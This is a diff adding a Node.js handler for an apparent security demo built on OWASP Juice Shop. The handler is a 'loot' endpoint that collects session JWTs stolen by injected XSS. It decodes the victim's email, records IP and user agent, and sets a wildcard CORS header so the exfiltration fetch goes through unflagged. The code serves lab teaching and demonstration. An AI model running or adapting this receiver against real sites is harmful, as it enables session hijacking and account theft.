@@ -1,0 +1,35 @@
+const crypto = require('crypto');
+const lootStore = require('../models/lootStore');
+const { decodeJwtEmail } = require('../services/decodeJwtEmail');
+const activityFeed = require('../../shared/infrastructure/activityFeed');
+const { EVENT_RATE_LIMITER } = require('../../shared/infrastructure/rateLimiter');
+
+// Loot from the QR arsenal: the XSS injected into Juice Shop exfiltrates the
+// session JWT here. This trap endpoint intentionally has NO auth — the victim
+// browser has no session with this app and cannot send a token. It stays
+// ephemeral like everything else: memory only, rate limited, capped.
+function collectLoot(req, res) {
+  const rawToken = String(req.query.loot || '').slice(0, 2000);
+  const stolen = rawToken !== '' && rawToken !== 'none';
+  const entry = {
+    id: crypto.randomUUID(),
+    ts: Date.now(),
+    ip: req.ip,
+    ua: String(req.headers['user-agent'] || '').slice(0, 120),
+    stolen,
+    email: null,
+    token: rawToken,
+  };
+  if (stolen) entry.email = decodeJwtEmail(rawToken);
+  lootStore.addLoot(entry);
+  activityFeed.recordFeedEvent({
+    type: 'loot_received',
+    payload: { stolen, email: entry.email },
+  });
+  // The exfiltration fetch runs with mode:'no-cors' from the victim's browser;
+  // the wildcard header keeps the request from being flagged as an error there.
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.status(204).end();
+}
+
+module.exports = { collectLoot, lootRateLimiter: EVENT_RATE_LIMITER };
